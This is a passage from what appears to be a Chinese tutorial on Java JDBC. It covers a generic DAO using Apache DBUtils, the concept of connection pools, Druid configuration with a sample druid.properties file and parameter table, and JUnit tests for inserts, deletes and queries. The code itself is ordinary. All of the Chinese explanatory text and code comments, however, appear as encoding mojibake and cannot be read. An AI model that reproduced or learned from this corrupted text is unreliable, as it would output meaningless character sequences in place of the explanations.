ParameterizedTypeè¡¨ç¤ºçš„æ˜¯å¸¦æ³›å‹çš„ç±»å‹ ParameterizedType parameterizedType = (ParameterizedType) clazz.getGenericSuperclass(); // è·å–å…·ä½“çš„æ³›å‹ç±»å‹ getActualTypeArgumentsè·å–å…·ä½“çš„æ³›å‹çš„ç±»å‹ // è¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªTypeçš„æ•°ç»„ Type[] types = parameterizedType.getActualTypeArguments(); // è·å–å…·ä½“çš„æ³›å‹çš„ç±»å‹Â· this.type = (Class\u0026lt;T\u0026gt;) types[0]; } /** * é€šç”¨çš„å¢åˆ æ”¹æ“ä½œ * * @param sql * @param params * @return */ public int update(Connection conn,String sql, Object... params) { int count = 0; try { count = queryRunner.update(conn, sql, params); } catch (SQLException e) { e.printStackTrace(); } return count; } /** * è·å–ä¸€ä¸ªå¯¹è±¡ * * @param sql * @param params * @return */ public T getBean(Connection conn,String sql, Object... params) { T t = null; try { t = queryRunner.query(conn, sql, new BeanHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return t; } /** * è·å–æ‰€æœ‰å¯¹è±¡ * * @param sql * @param params * @return */ public List\u0026lt;T\u0026gt; getBeanList(Connection conn,String sql, Object... params) { List\u0026lt;T\u0026gt; list = null; try { list = queryRunner.query(conn, sql, new BeanListHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return list; } /** * è·å–ä¸€ä¸ªä½†ä¸€å€¼å¾—æ–¹æ³•ï¼Œä¸“é—¨ç”¨æ¥æ‰§è¡Œåƒ select count(*)...è¿™æ ·çš„sqlè¯­å¥ * * @param sql * @param params * @return */ public Object getValue(Connection conn,String sql, Object... params) { Object count = null; try { // è°ƒç”¨queryRunnerçš„queryæ–¹æ³•è·å–ä¸€ä¸ªå•ä¸€çš„å€¼ count = queryRunner.query(conn, sql, new ScalarHandler\u0026lt;\u0026gt;(), params); } catch (SQLException e) { e.printStackTrace(); } return count; } } ä¹‹åå¯ä»¥å»ºç«‹ç›¸å…³çš„è¡¨ã€æ¥å£ï¼Œè¿›è€Œå°†å¯¹åº”è¡¨çš„DMLæ–¹æ³•å®ç° è¿™é‡Œä»¥customerè¡¨ä¸ºä¾‹å­ å…«ï¼šæ•°æ®åº“è¿æ¥æ±  8.1 æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ ä¸ºè§£å†³ä¼ ç»Ÿå¼€å‘ä¸­çš„æ•°æ®åº“è¿æ¥é—®é¢˜ï¼Œå¯ä»¥é‡‡ç”¨æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ã€‚\næ•°æ®åº“è¿æ¥æ± çš„åŸºæœ¬æ€æƒ³ï¼šå°±æ˜¯ä¸ºæ•°æ®åº“è¿æ¥å»ºç«‹ä¸€ä¸ªâ€œç¼“å†²æ± â€ã€‚é¢„å…ˆåœ¨ç¼“å†²æ± ä¸­æ”¾å…¥ä¸€å®šæ•°é‡çš„è¿æ¥ï¼Œå½“éœ€è¦å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶ï¼Œåªéœ€ä»â€œç¼“å†²æ± â€ä¸­å–å‡ºä¸€ä¸ªï¼Œä½¿ç”¨å®Œæ¯•ä¹‹åå†æ”¾å›å»ã€‚\næ•°æ®åº“è¿æ¥æ± è´Ÿè´£åˆ†é…ã€ç®¡ç†å’Œé‡Šæ”¾æ•°æ®åº“è¿æ¥ï¼Œå®ƒå…è®¸åº”ç”¨ç¨‹åºé‡å¤ä½¿ç”¨ä¸€ä¸ªç°æœ‰çš„æ•°æ®åº“è¿æ¥ï¼Œè€Œä¸æ˜¯é‡æ–°å»ºç«‹ä¸€ä¸ªã€‚\næ•°æ®åº“è¿æ¥æ± åœ¨åˆå§‹åŒ–æ—¶å°†åˆ›å»ºä¸€å®šæ•°é‡çš„æ•°æ®åº“è¿æ¥æ”¾åˆ°è¿æ¥æ± ä¸­ï¼Œè¿™äº›æ•°æ®åº“è¿æ¥çš„æ•°é‡æ˜¯ç”±æœ€å°æ•°æ®åº“è¿æ¥æ•°æ¥è®¾å®šçš„ã€‚æ— è®ºè¿™äº›æ•°æ®åº“è¿æ¥æ˜¯å¦è¢«ä½¿ç”¨ï¼Œè¿æ¥æ± éƒ½å°†ä¸€ç›´ä¿è¯è‡³å°‘æ‹¥æœ‰è¿™ä¹ˆå¤šçš„è¿æ¥æ•°é‡ã€‚è¿æ¥æ± çš„æœ€å¤§æ•°æ®åº“è¿æ¥æ•°é‡é™å®šäº†è¿™ä¸ªè¿æ¥æ± èƒ½å æœ‰çš„æœ€å¤§è¿æ¥æ•°ï¼Œå½“åº”ç”¨ç¨‹åºå‘è¿æ¥æ± è¯·æ±‚çš„è¿æ¥æ•°è¶…è¿‡æœ€å¤§è¿æ¥æ•°é‡æ—¶ï¼Œè¿™äº›è¯·æ±‚å°†è¢«åŠ å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚\nå·¥ä½œåŸç†ï¼š æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯çš„ä¼˜ç‚¹\n1. èµ„æºé‡ç”¨\nç”±äºæ•°æ®åº“è¿æ¥å¾—ä»¥é‡ç”¨ï¼Œé¿å…äº†é¢‘ç¹åˆ›å»ºï¼Œé‡Šæ”¾è¿æ¥å¼•èµ·çš„å¤§é‡æ€§èƒ½å¼€é”€ã€‚åœ¨å‡å°‘ç³»ç»Ÿæ¶ˆè€—çš„åŸºç¡€ä¸Šï¼Œå¦ä¸€æ–¹é¢ä¹Ÿå¢åŠ äº†ç³»ç»Ÿè¿è¡Œç¯å¢ƒçš„å¹³ç¨³æ€§ã€‚\n2. æ›´å¿«çš„ç³»ç»Ÿååº”é€Ÿåº¦\næ•°æ®åº“è¿æ¥æ± åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€å·²ç»åˆ›å»ºäº†è‹¥å¹²æ•°æ®åº“è¿æ¥ç½®äºè¿æ¥æ± ä¸­å¤‡ç”¨ã€‚æ­¤æ—¶è¿æ¥çš„åˆå§‹åŒ–å·¥ä½œå‡å·²å®Œæˆã€‚å¯¹äºä¸šåŠ¡è¯·æ±‚å¤„ç†è€Œè¨€ï¼Œç›´æ¥åˆ©ç”¨ç°æœ‰å¯ç”¨è¿æ¥ï¼Œé¿å…äº†æ•°æ®åº“è¿æ¥åˆå§‹åŒ–å’Œé‡Šæ”¾è¿‡ç¨‹çš„æ—¶é—´å¼€é”€ï¼Œä»è€Œå‡å°‘äº†ç³»ç»Ÿçš„å“åº”æ—¶é—´\n3. æ–°çš„èµ„æºåˆ†é…æ‰‹æ®µ\nå¯¹äºå¤šåº”ç”¨å…±äº«åŒä¸€æ•°æ®åº“çš„ç³»ç»Ÿè€Œè¨€ï¼Œå¯åœ¨åº”ç”¨å±‚é€šè¿‡æ•°æ®åº“è¿æ¥æ± çš„é…ç½®ï¼Œå®ç°æŸä¸€åº”ç”¨æœ€å¤§å¯ç”¨æ•°æ®åº“è¿æ¥æ•°çš„é™åˆ¶ï¼Œé¿å…æŸä¸€åº”ç”¨ç‹¬å æ‰€æœ‰çš„æ•°æ®åº“èµ„æº\n4. ç»Ÿä¸€çš„è¿æ¥ç®¡ç†ï¼Œé¿å…æ•°æ®åº“è¿æ¥æ³„æ¼\nåœ¨è¾ƒä¸ºå®Œå–„çš„æ•°æ®åº“è¿æ¥æ± å®ç°ä¸­ï¼Œå¯æ ¹æ®é¢„å…ˆçš„å ç”¨è¶…æ—¶è®¾å®šï¼Œå¼ºåˆ¶å›æ”¶è¢«å ç”¨è¿æ¥ï¼Œä»è€Œé¿å…äº†å¸¸è§„æ•°æ®åº“è¿æ¥æ“ä½œä¸­å¯èƒ½å‡ºç°çš„èµ„æºæ³„éœ²\n8.2 å¤šç§å¼€æºçš„æ•°æ®åº“è¿æ¥æ±  JDBC çš„æ•°æ®åº“è¿æ¥æ± ä½¿ç”¨ javax.sql.DataSource æ¥è¡¨ç¤ºï¼ŒDataSource åªæ˜¯ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£é€šå¸¸ç”±æœåŠ¡å™¨(Weblogic, WebSphere, Tomcat)æä¾›å®ç°ï¼Œä¹Ÿæœ‰ä¸€äº›å¼€æºç»„ç»‡æä¾›å®ç°ï¼š DBCP æ˜¯Apacheæä¾›çš„æ•°æ®åº“è¿æ¥æ± ã€‚tomcat æœåŠ¡å™¨è‡ªå¸¦dbcpæ•°æ®åº“è¿æ¥æ± ã€‚é€Ÿåº¦ç›¸å¯¹c3p0è¾ƒå¿«ï¼Œä½†å› è‡ªèº«å­˜åœ¨BUGï¼ŒHibernate3å·²ä¸å†æä¾›æ”¯æŒã€‚ C3P0 æ˜¯ä¸€ä¸ªå¼€æºç»„ç»‡æä¾›çš„ä¸€ä¸ªæ•°æ®åº“è¿æ¥æ± ï¼Œ**é€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ï¼Œç¨³å®šæ€§è¿˜å¯ä»¥ã€‚**hibernateå®˜æ–¹æ¨èä½¿ç”¨ Proxool æ˜¯sourceforgeä¸‹çš„ä¸€ä¸ªå¼€æºé¡¹ç›®æ•°æ®åº“è¿æ¥æ± ï¼Œæœ‰ç›‘æ§è¿æ¥æ± çŠ¶æ€çš„åŠŸèƒ½ï¼Œç¨³å®šæ€§è¾ƒc3p0å·®ä¸€ç‚¹ BoneCP æ˜¯ä¸€ä¸ªå¼€æºç»„ç»‡æä¾›çš„æ•°æ®åº“è¿æ¥æ± ï¼Œé€Ÿåº¦å¿« Druid æ˜¯é˜¿é‡Œæä¾›çš„æ•°æ®åº“è¿æ¥æ± ï¼Œæ®è¯´æ˜¯é›†DBCP ã€C3P0 ã€Proxool ä¼˜ç‚¹äºä¸€èº«çš„æ•°æ®åº“è¿æ¥æ± ï¼Œä½†æ˜¯é€Ÿåº¦ä¸ç¡®å®šæ˜¯å¦æœ‰BoneCPå¿« DataSource é€šå¸¸è¢«ç§°ä¸ºæ•°æ®æºï¼Œå®ƒåŒ…å«è¿æ¥æ± å’Œè¿æ¥æ± ç®¡ç†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¹ æƒ¯ä¸Šä¹Ÿç»å¸¸æŠŠ DataSource ç§°ä¸ºè¿æ¥æ±  DataSourceç”¨æ¥å–ä»£DriverManageræ¥è·å–Connectionï¼Œè·å–é€Ÿåº¦å¿«ï¼ŒåŒæ—¶å¯ä»¥å¤§å¹…åº¦æé«˜æ•°æ®åº“è®¿é—®é€Ÿåº¦ã€‚ ç‰¹åˆ«æ³¨æ„ï¼š æ•°æ®æºå’Œæ•°æ®åº“è¿æ¥ä¸åŒï¼Œæ•°æ®æºæ— éœ€åˆ›å»ºå¤šä¸ªï¼Œå®ƒæ˜¯äº§ç”Ÿæ•°æ®åº“è¿æ¥çš„å·¥å‚ï¼Œå› æ­¤æ•´ä¸ªåº”ç”¨åªéœ€è¦ä¸€ä¸ªæ•°æ®æºå³å¯ã€‚ å½“æ•°æ®åº“è®¿é—®ç»“æŸåï¼Œç¨‹åºè¿˜æ˜¯åƒä»¥å‰ä¸€æ ·å…³é—­æ•°æ®åº“è¿æ¥ï¼šconn.close(); ä½†conn.close()å¹¶æ²¡æœ‰å…³é—­æ•°æ®åº“çš„ç‰©ç†è¿æ¥ï¼Œå®ƒä»…ä»…æŠŠæ•°æ®åº“è¿æ¥é‡Šæ”¾ï¼Œå½’è¿˜ç»™äº†æ•°æ®åº“è¿æ¥æ± ã€‚ 8.2.1 Druidï¼ˆå¾·é²ä¼Šï¼‰æ•°æ®åº“è¿æ¥æ±  Druidæ˜¯é˜¿é‡Œå·´å·´å¼€æºå¹³å°ä¸Šä¸€ä¸ªæ•°æ®åº“è¿æ¥æ± å®ç°ï¼Œå®ƒç»“åˆäº†C3P0ã€DBCPã€Proxoolç­‰DBæ± çš„ä¼˜ç‚¹ï¼ŒåŒæ—¶åŠ å…¥äº†æ—¥å¿—ç›‘æ§ï¼Œå¯ä»¥å¾ˆå¥½çš„ç›‘æ§DBæ± è¿æ¥å’ŒSQLçš„æ‰§è¡Œæƒ…å†µï¼Œå¯ä»¥è¯´æ˜¯é’ˆå¯¹ç›‘æ§è€Œç”Ÿçš„DBè¿æ¥æ± ï¼Œå¯ä»¥è¯´æ˜¯ç›®å‰æœ€å¥½çš„è¿æ¥æ± ä¹‹ä¸€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.atguigu.druid; import java.sql.Connection; import java.util.Properties; import javax.sql.DataSource; import com.alibaba.druid.pool.DruidDataSourceFactory; public class TestDruid { public static void main(String[] args) throws Exception { Properties pro = new Properties();\tpro.load(TestDruid.class.getClassLoader().getResourceAsStream(\u0026#34;druid.properties\u0026#34;)); DataSource ds = DruidDataSourceFactory.createDataSource(pro); Connection conn = ds.getConnection(); System.out.println(conn); } } å…¶ä¸­ï¼Œsrcä¸‹çš„é…ç½®æ–‡ä»¶ä¸ºï¼šã€druid.propertiesã€‘\n1 2 3 4 5 6 7 8 9 url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true username=root password=123456 driverClassName=com.mysql.jdbc.Driver initialSize=10 maxActive=20 maxWait=1000 filters=wall è¯¦ç»†é…ç½®å‚æ•°ï¼š é…ç½® ç¼ºçœ è¯´æ˜ name é…ç½®è¿™ä¸ªå±æ€§çš„æ„ä¹‰åœ¨äºï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªæ•°æ®æºï¼Œç›‘æ§çš„æ—¶å€™å¯ä»¥é€šè¿‡åå­—æ¥åŒºåˆ†å¼€æ¥ã€‚ å¦‚æœæ²¡æœ‰é…ç½®ï¼Œå°†ä¼šç”Ÿæˆä¸€ä¸ªåå­—ï¼Œæ ¼å¼æ˜¯ï¼šâ€DataSource-â€ + System.identityHashCode(this) url è¿æ¥æ•°æ®åº“çš„urlï¼Œä¸åŒæ•°æ®åº“ä¸ä¸€æ ·ã€‚ä¾‹å¦‚ï¼šmysql : jdbc:mysql://10.20.153.104:3306/druid2 oracle : jdbc:oracle:thin:@10.20.149.85:1521:ocnauto username è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å password è¿æ¥æ•°æ®åº“çš„å¯†ç ã€‚å¦‚æœä½ ä¸å¸Œæœ›å¯†ç ç›´æ¥å†™åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ConfigFilterã€‚è¯¦ç»†çœ‹è¿™é‡Œï¼šhttps://github.com/alibaba/druid/wiki/%E4%BD%BF%E7%94%A8ConfigFilter driverClassName æ ¹æ®urlè‡ªåŠ¨è¯†åˆ« è¿™ä¸€é¡¹å¯é…å¯ä¸é…ï¼Œå¦‚æœä¸é…ç½®druidä¼šæ ¹æ®urlè‡ªåŠ¨è¯†åˆ«dbTypeï¼Œç„¶åé€‰æ‹©ç›¸åº”çš„driverClassName(å»ºè®®é…ç½®ä¸‹) initialSize 0 åˆå§‹åŒ–æ—¶å»ºç«‹ç‰©ç†è¿æ¥çš„ä¸ªæ•°ã€‚åˆå§‹åŒ–å‘ç”Ÿåœ¨æ˜¾ç¤ºè°ƒç”¨initæ–¹æ³•ï¼Œæˆ–è€…ç¬¬ä¸€æ¬¡getConnectionæ—¶ maxActive 8 æœ€å¤§è¿æ¥æ± æ•°é‡ maxIdle 8 å·²ç»ä¸å†ä½¿ç”¨ï¼Œé…ç½®äº†ä¹Ÿæ²¡æ•ˆæœ minIdle æœ€å°è¿æ¥æ± æ•°é‡ maxWait è·å–è¿æ¥æ—¶æœ€å¤§ç­‰å¾…æ—¶é—´ï¼Œå•ä½æ¯«ç§’ã€‚é…ç½®äº†maxWaitä¹‹åï¼Œç¼ºçœå¯ç”¨å…¬å¹³é”ï¼Œå¹¶å‘æ•ˆç‡ä¼šæœ‰æ‰€ä¸‹é™ï¼Œå¦‚æœéœ€è¦å¯ä»¥é€šè¿‡é…ç½®useUnfairLockå±æ€§ä¸ºtrueä½¿ç”¨éå…¬å¹³é”ã€‚ poolPreparedStatements false æ˜¯å¦ç¼“å­˜preparedStatementï¼Œä¹Ÿå°±æ˜¯PSCacheã€‚PSCacheå¯¹æ”¯æŒæ¸¸æ ‡çš„æ•°æ®åº“æ€§èƒ½æå‡å·¨å¤§ï¼Œæ¯”å¦‚è¯´oracleã€‚åœ¨mysqlä¸‹å»ºè®®å…³é—­ã€‚ maxOpenPreparedStatements -1 è¦å¯ç”¨PSCacheï¼Œå¿…é¡»é…ç½®å¤§äº0ï¼Œå½“å¤§äº0æ—¶ï¼ŒpoolPreparedStatementsè‡ªåŠ¨è§¦å‘ä¿®æ”¹ä¸ºtrueã€‚åœ¨Druidä¸­ï¼Œä¸ä¼šå­˜åœ¨Oracleä¸‹PSCacheå ç”¨å†…å­˜è¿‡å¤šçš„é—®é¢˜ï¼Œå¯ä»¥æŠŠè¿™ä¸ªæ•°å€¼é…ç½®å¤§ä¸€äº›ï¼Œæ¯”å¦‚è¯´100 validationQuery ç”¨æ¥æ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆçš„sqlï¼Œè¦æ±‚æ˜¯ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚å¦‚æœvalidationQueryä¸ºnullï¼ŒtestOnBorrowã€testOnReturnã€testWhileIdleéƒ½ä¸ä¼šå…¶ä½œç”¨ã€‚ testOnBorrow true ç”³è¯·è¿æ¥æ—¶æ‰§è¡ŒvalidationQueryæ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆï¼Œåšäº†è¿™ä¸ªé…ç½®ä¼šé™ä½æ€§èƒ½ã€‚ testOnReturn false å½’è¿˜è¿æ¥æ—¶æ‰§è¡ŒvalidationQueryæ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆï¼Œåšäº†è¿™ä¸ªé…ç½®ä¼šé™ä½æ€§èƒ½ testWhileIdle false å»ºè®®é…ç½®ä¸ºtrueï¼Œä¸å½±å“æ€§èƒ½ï¼Œå¹¶ä¸”ä¿è¯å®‰å…¨æ€§ã€‚ç”³è¯·è¿æ¥çš„æ—¶å€™æ£€æµ‹ï¼Œå¦‚æœç©ºé—²æ—¶é—´å¤§äºtimeBetweenEvictionRunsMillisï¼Œæ‰§è¡ŒvalidationQueryæ£€æµ‹è¿æ¥æ˜¯å¦æœ‰æ•ˆã€‚ timeBetweenEvictionRunsMillis æœ‰ä¸¤ä¸ªå«ä¹‰ï¼š 1)Destroyçº¿ç¨‹ä¼šæ£€æµ‹è¿æ¥çš„é—´éš”æ—¶é—´2)testWhileIdleçš„åˆ¤æ–­ä¾æ®ï¼Œè¯¦ç»†çœ‹testWhileIdleå±æ€§çš„è¯´æ˜ numTestsPerEvictionRun ä¸å†ä½¿ç”¨ï¼Œä¸€ä¸ªDruidDataSourceåªæ”¯æŒä¸€ä¸ªEvictionRun minEvictableIdleTimeMillis connectionInitSqls ç‰©ç†è¿æ¥åˆå§‹åŒ–çš„æ—¶å€™æ‰§è¡Œçš„sql exceptionSorter æ ¹æ®dbTypeè‡ªåŠ¨è¯†åˆ« å½“æ•°æ®åº“æŠ›å‡ºä¸€äº›ä¸å¯æ¢å¤çš„å¼‚å¸¸æ—¶ï¼ŒæŠ›å¼ƒè¿æ¥ filters å±æ€§ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œé€šè¿‡åˆ«åçš„æ–¹å¼é…ç½®æ‰©å±•æ’ä»¶ï¼Œå¸¸ç”¨çš„æ’ä»¶æœ‰ï¼š ç›‘æ§ç»Ÿè®¡ç”¨çš„filter:statæ—¥å¿—ç”¨çš„filter:log4jé˜²å¾¡sqlæ³¨å…¥çš„filter:wall proxyFilters ç±»å‹æ˜¯Listï¼Œå¦‚æœåŒæ—¶é…ç½®äº†filterså’ŒproxyFiltersï¼Œæ˜¯ç»„åˆå…³ç³»ï¼Œå¹¶éæ›¿æ¢å…³ç³» ä¹ï¼šApache-DBUtilså®ç°CRUDæ“ä½œ 9.1 Apache-DBUtilsç®€ä»‹ commons-dbutils æ˜¯ Apache ç»„ç»‡æä¾›çš„ä¸€ä¸ªå¼€æº JDBCå·¥å…·ç±»åº“ï¼Œå®ƒæ˜¯å¯¹JDBCçš„ç®€å•å°è£…ï¼Œå­¦ä¹ æˆæœ¬æä½ï¼Œå¹¶ä¸”ä½¿ç”¨dbutilsèƒ½æå¤§ç®€åŒ–jdbcç¼–ç çš„å·¥ä½œé‡ï¼ŒåŒæ—¶ä¹Ÿä¸ä¼šå½±å“ç¨‹åºçš„æ€§èƒ½ã€‚ APIä»‹ç»ï¼š org.apache.commons.dbutils.QueryRunner org.apache.commons.dbutils.ResultSetHandler å·¥å…·ç±»ï¼šorg.apache.commons.dbutils.DbUtils æœ‰äº†DBUtilså¯ä»¥ç›´æ¥è°ƒç”¨APIä½¿ç”¨å¢åˆ æ”¹æŸ¥æ“ä½œäº†ã€‚ 9.2 ä¸»è¦APIçš„ä½¿ç”¨ 9.2.1 DbUtils DbUtils ï¼šæä¾›å¦‚å…³é—­è¿æ¥ã€è£…è½½JDBCé©±åŠ¨ç¨‹åºç­‰å¸¸è§„å·¥ä½œçš„å·¥å…·ç±»ï¼Œé‡Œé¢çš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯é™æ€çš„ã€‚ä¸»è¦æ–¹æ³•å¦‚ä¸‹ï¼š public static void close(â€¦) throws java.sql.SQLExceptionï¼šã€€DbUtilsç±»æä¾›äº†ä¸‰ä¸ªé‡è½½çš„å…³é—­æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•æ£€æŸ¥æ‰€æä¾›çš„å‚æ•°æ˜¯ä¸æ˜¯NULLï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œå®ƒä»¬å°±å…³é—­Connectionã€Statementå’ŒResultSetã€‚ public static void closeQuietly(â€¦): è¿™ä¸€ç±»æ–¹æ³•ä¸ä»…èƒ½åœ¨Connectionã€Statementå’ŒResultSetä¸ºNULLæƒ…å†µä¸‹é¿å…å…³é—­ï¼Œè¿˜èƒ½éšè—ä¸€äº›åœ¨ç¨‹åºä¸­æŠ›å‡ºçš„SQLEeceptionã€‚ public static void commitAndClose(Connection conn)throws SQLExceptionï¼š ç”¨æ¥æäº¤è¿æ¥çš„äº‹åŠ¡ï¼Œç„¶åå…³é—­è¿æ¥ public static void commitAndCloseQuietly(Connection conn)ï¼š ç”¨æ¥æäº¤è¿æ¥ï¼Œç„¶åå…³é—­è¿æ¥ï¼Œå¹¶ä¸”åœ¨å…³é—­è¿æ¥æ—¶ä¸æŠ›å‡ºSQLå¼‚å¸¸ã€‚ public static void rollback(Connection conn)throws SQLExceptionï¼šå…è®¸connä¸ºnullï¼Œå› ä¸ºæ–¹æ³•å†…éƒ¨åšäº†åˆ¤æ–­ public static void rollbackAndClose(Connection conn)throws SQLException rollbackAndCloseQuietly(Connection) public static boolean loadDriver(java.lang.String driverClassName)ï¼šè¿™ä¸€æ–¹è£…è½½å¹¶æ³¨å†ŒJDBCé©±åŠ¨ç¨‹åºï¼Œå¦‚æœæˆåŠŸå°±è¿”å›trueã€‚ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä½ ä¸éœ€è¦æ•æ‰è¿™ä¸ªå¼‚å¸¸ClassNotFoundExceptionã€‚ 9.2.2 QueryRunnerç±» è¯¥ç±»ç®€å•åŒ–äº†SQLæŸ¥è¯¢ï¼Œå®ƒä¸ResultSetHandlerç»„åˆåœ¨ä¸€èµ·ä½¿ç”¨å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„æ•°æ®åº“æ“ä½œï¼Œèƒ½å¤Ÿå¤§å¤§å‡å°‘ç¼–ç é‡ã€‚ QueryRunnerç±»æä¾›äº†ä¸¤ä¸ªæ„é€ å™¨ï¼š é»˜è®¤çš„æ„é€ å™¨ éœ€è¦ä¸€ä¸ª javax.sql.DataSource æ¥ä½œå‚æ•°çš„æ„é€ å™¨ QueryRunnerç±»çš„ä¸»è¦æ–¹æ³•ï¼š æ›´æ–° public int update(Connection conn, String sql, Object... params) throws SQLException:ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ›´æ–°ï¼ˆæ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤ï¼‰æ“ä½œã€‚ \u0026hellip;\u0026hellip; æ’å…¥ public \u0026lt;T\u0026gt; T insert(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh, Object... params) throws SQLExceptionï¼šåªæ”¯æŒINSERTè¯­å¥ï¼Œå…¶ä¸­ rsh - The handler used to create the result object from the ResultSet of auto-generated keys. è¿”å›å€¼: An object generated by the handler.å³è‡ªåŠ¨ç”Ÿæˆçš„é”®å€¼ \u0026hellip;. æ‰¹å¤„ç† public int[] batch(Connection conn,String sql,Object[][] params)throws SQLExceptionï¼š INSERT, UPDATE, or DELETEè¯­å¥ public \u0026lt;T\u0026gt; T insertBatch(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh,Object[][] params)throws SQLExceptionï¼šåªæ”¯æŒINSERTè¯­å¥ æŸ¥è¯¢ public Object query(Connection conn, String sql, ResultSetHandler rsh,Object... params) throws SQLExceptionï¼šæ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢æ“ä½œï¼Œåœ¨è¿™ä¸ªæŸ¥è¯¢ä¸­ï¼Œå¯¹è±¡æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ å€¼è¢«ç”¨æ¥ä½œä¸ºæŸ¥è¯¢è¯­å¥çš„ç½®æ¢å‚æ•°ã€‚è¯¥æ–¹æ³•ä¼šè‡ªè¡Œå¤„ç† PreparedStatement å’Œ ResultSet çš„åˆ›å»ºå’Œå…³é—­ã€‚ æµ‹è¯• 1 2 3 4 5 6 7 8 9 10 11 12 13 // æµ‹è¯•æ·»åŠ  @Test public void testInsert() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;insert into customers(name,email,birth)values(?,?,?)\u0026#34;; int count = runner.update(conn, sql, \u0026#34;ä½•æˆé£\u0026#34;, \u0026#34;he@qq.com\u0026#34;, \u0026#34;1992-09-08\u0026#34;); System.out.println(\u0026#34;æ·»åŠ äº†\u0026#34; + count + \u0026#34;æ¡è®°å½•\u0026#34;); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 // æµ‹è¯•åˆ é™¤ @Test public void testDelete() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;delete from customers where id \u0026lt; ?\u0026#34;; int count = runner.update(conn, sql,3); System.out.println(\u0026#34;åˆ é™¤äº†\u0026#34; + count + \u0026#34;æ¡è®°å½•\u0026#34;); JDBCUtils.closeResource(conn, null); } 9.2.3 ResultSetHandleræ¥å£åŠå®ç°ç±» è¯¥æ¥å£ç”¨äºå¤„ç† java.sql.ResultSetï¼Œå°†æ•°æ®æŒ‰è¦æ±‚è½¬æ¢ä¸ºå¦ä¸€ç§å½¢å¼ã€‚\nResultSetHandler æ¥å£æä¾›äº†ä¸€ä¸ªå•ç‹¬çš„æ–¹æ³•ï¼šObject handle (java.sql.ResultSet .rs)ã€‚\næ¥å£çš„ä¸»è¦å®ç°ç±»ï¼š\nArrayHandlerï¼šæŠŠç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®è½¬æˆå¯¹è±¡æ•°ç»„ã€‚ ArrayListHandlerï¼šæŠŠç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½è½¬æˆä¸€ä¸ªæ•°ç»„ï¼Œå†å­˜æ”¾åˆ°Listä¸­ã€‚ **BeanHandlerï¼š**å°†ç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®å°è£…åˆ°ä¸€ä¸ªå¯¹åº”çš„JavaBeanå®ä¾‹ä¸­ã€‚ **BeanListHandlerï¼š**å°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªå¯¹åº”çš„JavaBeanå®ä¾‹ä¸­ï¼Œå­˜æ”¾åˆ°Listé‡Œã€‚ ColumnListHandlerï¼šå°†ç»“æœé›†ä¸­æŸä¸€åˆ—çš„æ•°æ®å­˜æ”¾åˆ°Listä¸­ã€‚ KeyedHandler(name)ï¼šå°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œå†æŠŠè¿™äº›mapå†å­˜åˆ°ä¸€ä¸ªmapé‡Œï¼Œå…¶keyä¸ºæŒ‡å®šçš„keyã€‚ **MapHandlerï¼š**å°†ç»“æœé›†ä¸­çš„ç¬¬ä¸€è¡Œæ•°æ®å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œkeyæ˜¯åˆ—åï¼Œvalueå°±æ˜¯å¯¹åº”çš„å€¼ã€‚ **MapListHandlerï¼š**å°†ç»“æœé›†ä¸­çš„æ¯ä¸€è¡Œæ•°æ®éƒ½å°è£…åˆ°ä¸€ä¸ªMapé‡Œï¼Œç„¶åå†å­˜æ”¾åˆ°List **ScalarHandlerï¼š**æŸ¥è¯¢å•ä¸ªå€¼å¯¹è±¡ æµ‹è¯•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* * æµ‹è¯•æŸ¥è¯¢:æŸ¥è¯¢ä¸€æ¡è®°å½• * * ä½¿ç”¨ResultSetHandlerçš„å®ç°ç±»ï¼šBeanHandler */ @Test public void testQueryInstance() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String 